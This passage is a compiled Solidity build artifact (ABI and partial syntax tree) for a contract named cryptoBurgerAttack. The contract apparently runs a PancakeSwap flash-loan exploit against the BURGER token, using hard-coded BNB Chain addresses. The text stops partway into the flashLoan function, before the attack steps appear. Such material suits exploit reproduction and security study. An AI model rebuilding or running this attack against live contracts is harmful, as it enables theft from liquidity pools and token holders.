{
  "abi": [
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "string",
          "name": "message",
          "type": "string"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "LOG",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "string",
          "name": "message",
          "type": "string"
        },
        {
          "indexed": false,
          "internalType": "address",
          "name": "amount",
          "type": "address"
        }
      ],
      "name": "LOGAdd",
      "type": "event"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_tokenBorrow",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "_amount",
          "type": "uint256"
        }
      ],
      "name": "flashLoan",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_sender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "_amount0",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "_amount1",
          "type": "uint256"
        },
        {
          "internalType": "bytes",
          "name": "_data",
          "type": "bytes"
        }
      ],
      "name": "pancakeCall",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "allSourcePaths": {
    "0": "contracts/burger_attack.sol",
    "1": "interfaces/IERC20.sol",
    "2": "interfaces/sushiswap.sol"
  },
  "ast": {
    "absolutePath": "contracts/burger_attack.sol",
    "exportedSymbols": {
      "IERC20": [
        1557
      ],
      "IPancakeCallee": [
        15
      ],
      "IPancakeFactory": [
        1772
      ],
      "IPancakePair": [
        1762
      ],
      "IPancakeRouter01": [
        1728
      ],
      "IWBNB": [
        26
      ],
      "cryptoBurgerAttack": [
        1472
      ]
    },
    "id": 1473,
    "license": "MIT",
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 1,
        "literals": [
          "solidity",
          "^",
          "0.8",
          ".0"
        ],
        "nodeType": "PragmaDirective",
        "src": "32:23:0"
      },
      {
        "absolutePath": "interfaces/IERC20.sol",
        "file": "../interfaces/IERC20.sol",
        "id": 2,
        "nameLocation": "-1:-1:-1",
        "nodeType": "ImportDirective",
        "scope": 1473,
        "sourceUnit": 1558,
        "src": "57:34:0",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "absolutePath": "interfaces/sushiswap.sol",
        "file": "../interfaces/sushiswap.sol",
        "id": 3,
        "nameLocation": "-1:-1:-1",
        "nodeType": "ImportDirective",
        "scope": 1473,
        "sourceUnit": 1773,
        "src": "92:37:0",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "abstract": false,
        "baseContracts": [],
        "canonicalName": "IPancakeCallee",
        "contractDependencies": [],
        "contractKind": "interface",
        "fullyImplemented": false,
        "id": 15,
        "linearizedBaseContracts": [
          15
        ],
        "name": "IPancakeCallee",
        "nameLocation": "141:14:0",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "functionSelector": "84800812",
            "id": 14,
            "implemented": false,
            "kind": "function",
            "modifiers": [],
            "name": "pancakeCall",
            "nameLocation": "171:11:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 12,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 5,
                  "mutability": "mutable",
                  "name": "sender",
                  "nameLocation": "200:6:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 14,
                  "src": "192:14:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 4,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "192:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 7,
                  "mutability": "mutable",
                  "name": "amount0",
                  "nameLocation": "224:7:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 14,
                  "src": "216:15:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 6,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "216:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 9,
                  "mutability": "mutable",
                  "name": "amount1",
                  "nameLocation": "249:7:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 14,
                  "src": "241:15:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 8,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "241:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 11,
                  "mutability": "mutable",
                  "name": "data",
                  "nameLocation": "281:4:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 14,
                  "src": "266:19:0",
                  "stateVariable": false,
                  "storageLocation": "calldata",
                  "typeDescriptions": {
                    "typeIdentifier": "t_bytes_calldata_ptr",
                    "typeString": "bytes"
                  },
                  "typeName": {
                    "id": 10,
                    "name": "bytes",
                    "nodeType": "ElementaryTypeName",
                    "src": "266:5:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bytes_storage_ptr",
                      "typeString": "bytes"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "182:109:0"
            },
            "returnParameters": {
              "id": 13,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "300:0:0"
            },
            "scope": 15,
            "src": "162:139:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "external"
          }
        ],
        "scope": 1473,
        "src": "131:172:0",
        "usedErrors": []
      },
      {
        "abstract": false,
        "baseContracts": [
          {
            "baseName": {
              "id": 16,
              "name": "IERC20",
              "nodeType": "IdentifierPath",
              "referencedDeclaration": 1557,
              "src": "324:6:0"
            },
            "id": 17,
            "nodeType": "InheritanceSpecifier",
            "src": "324:6:0"
          }
        ],
        "canonicalName": "IWBNB",
        "contractDependencies": [],
        "contractKind": "interface",
        "fullyImplemented": false,
        "id": 26,
        "linearizedBaseContracts": [
          26,
          1557
        ],
        "name": "IWBNB",
        "nameLocation": "315:5:0",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "functionSelector": "d0e30db0",
            "id": 20,
            "implemented": false,
            "kind": "function",
            "modifiers": [],
            "name": "deposit",
            "nameLocation": "346:7:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 18,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "353:2:0"
            },
            "returnParameters": {
              "id": 19,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "372:0:0"
            },
            "scope": 26,
            "src": "337:36:0",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "functionSelector": "2e1a7d4d",
            "id": 25,
            "implemented": false,
            "kind": "function",
            "modifiers": [],
            "name": "withdraw",
            "nameLocation": "388:8:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 23,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 22,
                  "mutability": "mutable",
                  "name": "",
                  "nameLocation": "-1:-1:-1",
                  "nodeType": "VariableDeclaration",
                  "scope": 25,
                  "src": "397:7:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 21,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "397:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "396:9:0"
            },
            "returnParameters": {
              "id": 24,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "414:0:0"
            },
            "scope": 26,
            "src": "379:36:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "external"
          }
        ],
        "scope": 1473,
        "src": "305:112:0",
        "usedErrors": []
      },
      {
        "abstract": false,
        "baseContracts": [
          {
            "baseName": {
              "id": 27,
              "name": "IPancakeCallee",
              "nodeType": "IdentifierPath",
              "referencedDeclaration": 15,
              "src": "450:14:0"
            },
            "id": 28,
            "nodeType": "InheritanceSpecifier",
            "src": "450:14:0"
          }
        ],
        "canonicalName": "cryptoBurgerAttack",
        "contractDependencies": [],
        "contractKind": "contract",
        "fullyImplemented": true,
        "id": 1472,
        "linearizedBaseContracts": [
          1472,
          15
        ],
        "name": "cryptoBurgerAttack",
        "nameLocation": "428:18:0",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "constant": true,
            "id": 31,
            "mutability": "constant",
            "name": "PANCAKE_SWAP_ROUTER",
            "nameLocation": "496:19:0",
            "nodeType": "VariableDeclaration",
            "scope": 1472,
            "src": "471:97:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 29,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "471:7:0",
              "stateMutability": "nonpayable",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "value": {
              "hexValue": "307831304544343343373138373134656236336435614135374237384235343730344532353630323445",
              "id": 30,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "number",
              "lValueRequested": false,
              "nodeType": "Literal",
              "src": "526:42:0",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              },
              "value": "0x10ED43C718714eb63d5aA57B78B54704E256024E"
            },
            "visibility": "private"
          },
          {
            "constant": true,
            "id": 34,
            "mutability": "constant",
            "name": "PANCAKE_SWAP_FACTORY",
            "nameLocation": "600:20:0",
            "nodeType": "VariableDeclaration",
            "scope": 1472,
            "src": "575:98:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 32,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "575:7:0",
              "stateMutability": "nonpayable",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "value": {
              "hexValue": "307863413134334365333246653738663166373031396437643535316136343032664335333530633733",
              "id": 33,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "number",
              "lValueRequested": false,
              "nodeType": "Literal",
              "src": "631:42:0",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              },
              "value": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73"
            },
            "visibility": "private"
          },
          {
            "constant": true,
            "id": 37,
            "mutability": "constant",
            "name": "PANCAKE_SWAP_PAIR",
            "nameLocation": "705:17:0",
            "nodeType": "VariableDeclaration",
            "scope": 1472,
            "src": "680:95:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 35,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "680:7:0",
              "stateMutability": "nonpayable",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "value": {
              "hexValue": "307830326230353531423635363530393735343238356565433831654538393433333845313443354444",
              "id": 36,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "number",
              "lValueRequested": false,
              "nodeType": "Literal",
              "src": "733:42:0",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              },
              "value": "0x02b0551B656509754285eeC81eE894338E14C5DD"
            },
            "visibility": "private"
          },
          {
            "constant": true,
            "id": 40,
            "mutability": "constant",
            "name": "WBNB",
            "nameLocation": "807:4:0",
            "nodeType": "VariableDeclaration",
            "scope": 1472,
            "src": "782:74:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 38,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "782:7:0",
              "stateMutability": "nonpayable",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "value": {
              "hexValue": "307862623443644239434264333642303162443163426145424632446530386439313733626330393563",
              "id": 39,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "number",
              "lValueRequested": false,
              "nodeType": "Literal",
              "src": "814:42:0",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              },
              "value": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"
            },
            "visibility": "private"
          },
          {
            "constant": true,
            "id": 43,
            "mutability": "constant",
            "name": "USDC",
            "nameLocation": "888:4:0",
            "nodeType": "VariableDeclaration",
            "scope": 1472,
            "src": "863:74:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 41,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "863:7:0",
              "stateMutability": "nonpayable",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "value": {
              "hexValue": "307838414337366135316363393530643938323244363862383366453141643937423332436435383064",
              "id": 42,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "number",
              "lValueRequested": false,
              "nodeType": "Literal",
              "src": "895:42:0",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              },
              "value": "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"
            },
            "visibility": "private"
          },
          {
            "constant": true,
            "id": 46,
            "mutability": "constant",
            "name": "BURGER",
            "nameLocation": "969:6:0",
            "nodeType": "VariableDeclaration",
            "scope": 1472,
            "src": "944:84:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 44,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "944:7:0",
              "stateMutability": "nonpayable",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "value": {
              "hexValue": "307846343064333344453637333733363741316343423063453661303536363938443939334131374531",
              "id": 45,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "number",
              "lValueRequested": false,
              "nodeType": "Literal",
              "src": "986:42:0",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              },
              "value": "0xF40d33DE6737367A1cCB0cE6a056698D993A17E1"
            },
            "visibility": "private"
          },
          {
            "constant": false,
            "id": 52,
            "mutability": "mutable",
            "name": "WBNB_interface",
            "nameLocation": "1042:14:0",
            "nodeType": "VariableDeclaration",
            "scope": 1472,
            "src": "1035:36:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_IERC20_$1557",
              "typeString": "contract IERC20"
            },
            "typeName": {
              "id": 48,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 47,
                "name": "IERC20",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 1557,
                "src": "1035:6:0"
              },
              "referencedDeclaration": 1557,
              "src": "1035:6:0",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IERC20_$1557",
                "typeString": "contract IERC20"
              }
            },
            "value": {
              "arguments": [
                {
                  "id": 50,
                  "name": "WBNB",
                  "nodeType": "Identifier",
                  "overloadedDeclarations": [],
                  "referencedDeclaration": 40,
                  "src": "1066:4:0",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  }
                }
              ],
              "expression": {
                "argumentTypes": [
                  {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  }
                ],
                "id": 49,
                "name": "IERC20",
                "nodeType": "Identifier",
                "overloadedDeclarations": [],
                "referencedDeclaration": 1557,
                "src": "1059:6:0",
                "typeDescriptions": {
                  "typeIdentifier": "t_type$_t_contract$_IERC20_$1557_$",
                  "typeString": "type(contract IERC20)"
                }
              },
              "id": 51,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "typeConversion",
              "lValueRequested": false,
              "names": [],
              "nodeType": "FunctionCall",
              "src": "1059:12:0",
              "tryCall": false,
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IERC20_$1557",
                "typeString": "contract IERC20"
              }
            },
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 58,
            "mutability": "mutable",
            "name": "BURGER_interface",
            "nameLocation": "1084:16:0",
            "nodeType": "VariableDeclaration",
            "scope": 1472,
            "src": "1077:40:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_IERC20_$1557",
              "typeString": "contract IERC20"
            },
            "typeName": {
              "id": 54,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 53,
                "name": "IERC20",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 1557,
                "src": "1077:6:0"
              },
              "referencedDeclaration": 1557,
              "src": "1077:6:0",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IERC20_$1557",
                "typeString": "contract IERC20"
              }
            },
            "value": {
              "arguments": [
                {
                  "id": 56,
                  "name": "BURGER",
                  "nodeType": "Identifier",
                  "overloadedDeclarations": [],
                  "referencedDeclaration": 46,
                  "src": "1110:6:0",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  }
                }
              ],
              "expression": {
                "argumentTypes": [
                  {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  }
                ],
                "id": 55,
                "name": "IERC20",
                "nodeType": "Identifier",
                "overloadedDeclarations": [],
                "referencedDeclaration": 1557,
                "src": "1103:6:0",
                "typeDescriptions": {
                  "typeIdentifier": "t_type$_t_contract$_IERC20_$1557_$",
                  "typeString": "type(contract IERC20)"
                }
              },
              "id": 57,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "typeConversion",
              "lValueRequested": false,
              "names": [],
              "nodeType": "FunctionCall",
              "src": "1103:14:0",
              "tryCall": false,
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IERC20_$1557",
                "typeString": "contract IERC20"
              }
            },
            "visibility": "internal"
          },
          {
            "anonymous": false,
            "eventSelector": "500a5c23c900bdde1352bb093d0b6480339dc3317c387f4a23ff9aecc606ff45",
            "id": 64,
            "name": "LOG",
            "nameLocation": "1130:3:0",
            "nodeType": "EventDefinition",
            "parameters": {
              "id": 63,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 60,
                  "indexed": false,
                  "mutability": "mutable",
                  "name": "message",
                  "nameLocation": "1141:7:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 64,
                  "src": "1134:14:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_string_memory_ptr",
                    "typeString": "string"
                  },
                  "typeName": {
                    "id": 59,
                    "name": "string",
                    "nodeType": "ElementaryTypeName",
                    "src": "1134:6:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_string_storage_ptr",
                      "typeString": "string"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 62,
                  "indexed": false,
                  "mutability": "mutable",
                  "name": "amount",
                  "nameLocation": "1158:6:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 64,
                  "src": "1150:14:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 61,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "1150:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "1133:32:0"
            },
            "src": "1124:42:0"
          },
          {
            "anonymous": false,
            "eventSelector": "5aacbf7091ac31b69cae6113c7fdaba6dd254f9c9e15989357385deacd2a788f",
            "id": 70,
            "name": "LOGAdd",
            "nameLocation": "1177:6:0",
            "nodeType": "EventDefinition",
            "parameters": {
              "id": 69,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 66,
                  "indexed": false,
                  "mutability": "mutable",
                  "name": "message",
                  "nameLocation": "1191:7:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 70,
                  "src": "1184:14:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_string_memory_ptr",
                    "typeString": "string"
                  },
                  "typeName": {
                    "id": 65,
                    "name": "string",
                    "nodeType": "ElementaryTypeName",
                    "src": "1184:6:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_string_storage_ptr",
                      "typeString": "string"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 68,
                  "indexed": false,
                  "mutability": "mutable",
                  "name": "amount",
                  "nameLocation": "1208:6:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 70,
                  "src": "1200:14:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 67,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "1200:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "1183:32:0"
            },
            "src": "1171:45:0"
          },
          {
            "body": {
              "id": 148,
              "nodeType": "Block",
              "src": "1287:634:0",
              "statements": [
                {
                  "assignments": [
                    78
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 78,
                      "mutability": "mutable",
                      "name": "pair",
                      "nameLocation": "1305:4:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 148,
                      "src": "1297:12:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      },
                      "typeName": {
                        "id": 77,
                        "name": "address",
                        "nodeType": "ElementaryTypeName",
                        "src": "1297:7:0",
                        "stateMutability": "nonpayable",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 86,
                  "initialValue": {
                    "arguments": [
                      {
                        "id": 83,
                        "name": "_tokenBorrow",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 72,
                        "src": "1371:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 84,
                        "name": "USDC",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 43,
                        "src": "1397:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      ],
                      "expression": {
                        "arguments": [
                          {
                            "id": 80,
                            "name": "PANCAKE_SWAP_FACTORY",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 34,
                            "src": "1328:20:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 79,
                          "name": "IPancakeFactory",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 1772,
                          "src": "1312:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_contract$_IPancakeFactory_$1772_$",
                            "typeString": "type(contract IPancakeFactory)"
                          }
                        },
                        "id": 81,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1312:37:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IPancakeFactory_$1772",
                          "typeString": "contract IPancakeFactory"
                        }
                      },
                      "id": 82,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "getPair",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 1771,
                      "src": "1312:45:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_view$_t_address_$_t_address_$returns$_t_address_$",
                        "typeString": "function (address,address) view external returns (address)"
                      }
                    },
                    "id": 85,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1312:99:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "1297:114:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "commonType": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        "id": 93,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "id": 88,
                          "name": "pair",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 78,
                          "src": "1462:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "!=",
                        "rightExpression": {
                          "arguments": [
                            {
                              "hexValue": "30",
                              "id": 91,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "1478:1:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_0_by_1",
                                "typeString": "int_const 0"
                              },
                              "value": "0"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_0_by_1",
                                "typeString": "int_const 0"
                              }
                            ],
                            "id": 90,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "nodeType": "ElementaryTypeNameExpression",
                            "src": "1470:7:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_address_$",
                              "typeString": "type(address)"
                            },
                            "typeName": {
                              "id": 89,
                              "name": "address",
                              "nodeType": "ElementaryTypeName",
                              "src": "1470:7:0",
                              "typeDescriptions": {}
                            }
                          },
                          "id": 92,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "1470:10:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "src": "1462:18:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      {
                        "hexValue": "5061697220646f65736e27742065786973747321",
                        "id": 94,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1482:22:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_1260a0258694cec8dc5d8448e0a2ce3d0bc790a99ec4538ac497e5271dd99617",
                          "typeString": "literal_string \"Pair doesn't exists!\""
                        },
                        "value": "Pair doesn't exists!"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_1260a0258694cec8dc5d8448e0a2ce3d0bc790a99ec4538ac497e5271dd99617",
                          "typeString": "literal_string \"Pair doesn't exists!\""
                        }
                      ],
                      "id": 87,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        -18,
                        -18
                      ],
                      "referencedDeclaration": -18,
                      "src": "1454:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (bool,string memory) pure"
                      }
                    },
                    "id": 95,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1454:51:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 96,
                  "nodeType": "ExpressionStatement",
                  "src": "1454:51:0"
                },
                {
                  "assignments": [
                    98
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 98,
                      "mutability": "mutable",
                      "name": "token0",
                      "nameLocation": "1524:6:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 148,
                      "src": "1516:14:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      },
                      "typeName": {
                        "id": 97,
                        "name": "address",
